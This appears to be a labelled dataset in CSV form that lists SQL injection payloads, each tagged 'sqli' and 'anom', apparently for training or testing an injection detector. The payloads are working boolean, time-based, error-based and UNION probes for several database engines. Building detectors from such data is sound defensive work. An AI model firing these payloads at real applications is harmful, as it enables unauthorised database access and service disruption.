"payload","length","attack_type","label"
"1',(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))","84","sqli","anom"
"1))) union all select null,null,null,null,null,null,null,null--","63","sqli","anom"
"1%""))) or sleep(5)#","19","sqli","anom"
"-5243"" where 2105=2105 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","255","sqli","anom"
"1') and sleep(5) and ('orxt'='orxt","34","sqli","anom"
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('rqbf'='rqbf","129","sqli","anom"
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('pbtf'='pbtf","225","sqli","anom"
"1%"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""","152","sqli","anom"
"1'+(select 'ljtl' where 1766=1766;select count(*) from generate_series(1,5000000))+'","84","sqli","anom"
"1 and 5934=7745","15","sqli","anom"
"-1641')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('vgcb' like 'vgcb","263","sqli","anom"
"1"")) as casz where 5921=5921 rlike (select * from (select(sleep(5)))vwyq)#","74","sqli","anom"
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--","95","sqli","anom"
"1' in boolean mode) and 8594=(select 8594 from pg_sleep(5))--","61","sqli","anom"
"1') where 7478=7478;select pg_sleep(5)--","40","sqli","anom"
"1'||(select 'hafu' where 6226=6226;(select * from (select(sleep(5)))srmq))||'","77","sqli","anom"
"1'))) and 5934=2309","19","sqli","anom"
"-1559 union all select 3985,3985,3985,3985#","43","sqli","anom"
"1%') and sleep(5) and ('%'='","28","sqli","anom"
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('onmp'='onmp","178","sqli","anom"
"1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--","64","sqli","anom"
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('luoj'='luoj","125","sqli","anom"
"-5819%"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""%""=""","252","sqli","anom"
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","96","sqli","anom"
"1' in boolean mode) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))#","80","sqli","anom"
"1%"")) and 4595=4595#","20","sqli","anom"
"-5803) where 8651=8651 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","222","sqli","anom"
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk","170","sqli","anom"
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)","173","sqli","anom"
"-4945 or make_set(9354=9354,7185)","33","sqli","anom"
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc","115","sqli","anom"
"1' and (select * from (select(sleep(5)))fzno) and 'gpax'='gpax","62","sqli","anom"
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- cbsd","108","sqli","anom"
"1') where 4683=4683 and 3824=benchmark(5000000,md5(0x76555642))--","65","sqli","anom"
"1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj","90","sqli","anom"
"1)) as zdbj where 2300=2300 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","227","sqli","anom"
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ctdx","158","sqli","anom"
"1"") as rnte where 6517=6517 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","135","sqli","anom"
"1""))) and elt(4249=4249,7259) and (((""awyk"" like ""awyk","54","sqli","anom"
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--","230","sqli","anom"
"1"")) as yutu where 1306=1306 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--","105","sqli","anom"
"-9356 or elt(1032=1032,3623)-- izgi","35","sqli","anom"
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup""=""vcup","105","sqli","anom"
"1%'))) and elt(4249=4249,7259) and ((('%'='","43","sqli","anom"
"1%'));select pg_sleep(5)--","26","sqli","anom"
"1') as mmhe where 2142=2142 or 8466=benchmark(5000000,md5(0x694a4745))--","72","sqli","anom"
"-7544"")) union all select 3808,3808,3808,3808--","47","sqli","anom"
"1'||(select 'xjcg' from dual where 5815=5815 union all select null,null,null#","77","sqli","anom"
"-4091)) as lqqy where 3030=3030 union all select 3030,3030,3030#","64","sqli","anom"
"-7430') as xfah where 1596=1596 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","264","sqli","anom"
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""zzmn""=""zzmn","118","sqli","anom"
"1%') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='","165","sqli","anom"
"1""));waitfor delay '0:0:5' and ((""ykgm""=""ykgm","45","sqli","anom"
"1%"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","90","sqli","anom"
"-3297' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","208","sqli","anom"
"1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk","66","sqli","anom"
"1"" where 1115=1115 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--","80","sqli","anom"
"1%"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""","163","sqli","anom"
"1') where 5540=5540 waitfor delay '0:0:5'--","43","sqli","anom"
"1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","106","sqli","anom"
"1) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","155","sqli","anom"
"-6335""))) union all select 3654--","33","sqli","anom"
"1""))) union all select null,null--","34","sqli","anom"
"1%""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","97","sqli","anom"
"1%') and 8594=(select 8594 from pg_sleep(5))--","46","sqli","anom"
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null)","68","sqli","anom"
"1'+(select 'qsqs' where 9227=9227 waitfor delay '0:0:5')+'","58","sqli","anom"
"1 where 1092=1092;waitfor delay '0:0:5'--","41","sqli","anom"
"-2298%' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","138","sqli","anom"
"-7738%"") union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#","71","sqli","anom"
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('dsok'='dsok","196","sqli","anom"
"1"")) as czzg where 5483=5483 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--","133","sqli","anom"
"1"") where 9827=9827;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","120","sqli","anom"
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""ihqf""=""ihqf","111","sqli","anom"
"1') as upgb where 2031=2031;select case when 7717=7717 then 1 else null end--","77","sqli","anom"
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--","126","sqli","anom"
"1'))) rlike sleep(5) and ((('rozr' like 'rozr","45","sqli","anom"
"1'||(select 'bqhi' from dual where 7409=7409;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'","114","sqli","anom"
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4","97","sqli","anom"
"1%');(select * from (select(sleep(5)))acdk)#","44","sqli","anom"
"1' where 2183=2183;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","83","sqli","anom"
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('tblb'='tblb","112","sqli","anom"
"1');begin user_lock.sleep(5); end and ('unko'='unko","51","sqli","anom"
"-3084%')) order by 1--","22","sqli","anom"
"1""))) rlike (select (case when (7975=2446) then 1 else 0x28 end)) and (((""qixm"" like ""qixm","90","sqli","anom"
"1') and (3020=3020)*6703 and ('lhfa'='lhfa","42","sqli","anom"
"1';select pg_sleep(5) and 'qfaz' like 'qfaz","43","sqli","anom"
"1"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","156","sqli","anom"
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='","100","sqli","anom"
"1%')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='","168","sqli","anom"
"1'+(select 'bmit' where 3716=3716 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'","238","sqli","anom"
"1%"")));select case when 4176=6138 then 1 else null end--","56","sqli","anom"
"-9005 union all select 4410#","28","sqli","anom"
"1%""))) and make_set(8403=8403,8899) and (((""%""=""","48","sqli","anom"
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""mlld"" like ""mlld","118","sqli","anom"
"1"") and 6565=2647 and (""mrge"" like ""mrge","40","sqli","anom"
"(select 2768 from(select count(*),concat(0x7171706a71,(select (elt(2768=2768,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)","166","sqli","anom"
"1'||(select 'pnsw' where 2103=2103 union all select null,null,null,null,null,null,null,null--","93","sqli","anom"
"1"" where 1618=1618 or 8156=(select count(*) from generate_series(1,5000000))--","78","sqli","anom"
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (3343=3343","213","sqli","anom"
"1);select pg_sleep(5)","21","sqli","anom"
"1',iif(6625=6625,1,1/0)","23","sqli","anom"
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('rdpv'='rdpv","193","sqli","anom"
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((3508=3508","105","sqli","anom"
"1'+(select vupb where 9575=9575 union all select null,null,null,null,null,null,null,null,null,null--","100","sqli","anom"
"1%')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='","118","sqli","anom"
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lzyl"" like ""lzyl","129","sqli","anom"
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('tpeo' like 'tpeo","73","sqli","anom"
"1) as cwsi where 7360=7360 or sleep(5)#","39","sqli","anom"
"1"" where 1719=1719 and 7533=7533--","34","sqli","anom"
"1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('gegg'='gegg","212","sqli","anom"
"1)) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","105","sqli","anom"
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""fpwu"" like ""fpwu","134","sqli","anom"
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('cpoy'='cpoy","96","sqli","anom"
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184","217","sqli","anom"
"1"") as ybkp where 7788=7788 or 8466=benchmark(5000000,md5(0x694a4745))--","72","sqli","anom"
"1"" where 4652=4652 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--","81","sqli","anom"
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('wbsz'='wbsz","224","sqli","anom"
"-3436) or elt(1032=1032,3623)","29","sqli","anom"
"1"" where 1234=1234;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","79","sqli","anom"
"1"" where 6281=6281 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","125","sqli","anom"
"1')) as njop where 7001=7001;begin user_lock.sleep(5); end--","60","sqli","anom"
"-3781) union all select 3916,3916,3916--","40","sqli","anom"
"-5493"")) union all select 8001,8001--","37","sqli","anom"
"-5425 where 5933=5933 union all select 5933,5933,5933--","55","sqli","anom"
"-3721') union all select 9050,9050--","36","sqli","anom"
"1"") or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","79","sqli","anom"
"1'))) waitfor delay '0:0:5' and ((('wvzb'='wvzb","47","sqli","anom"
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))","200","sqli","anom"
"1') as chla where 6098=6098;select benchmark(5000000,md5(0x4c4d6142))--","71","sqli","anom"
"1%"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""","73","sqli","anom"
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('dreq'='dreq","83","sqli","anom"
"-2790"")) as vcvw where 6075=6075 or 7078=8148--","47","sqli","anom"
"1) where 6082=6082 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","191","sqli","anom"
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)","132","sqli","anom"
"1) where 8813=8813;waitfor delay '0:0:5'--","42","sqli","anom"
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((3127=3127","118","sqli","anom"
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ycuo"" like ""ycuo","122","sqli","anom"
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""lynw"" like ""lynw","88","sqli","anom"
"1') as irsh where 4973=4973 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","134","sqli","anom"
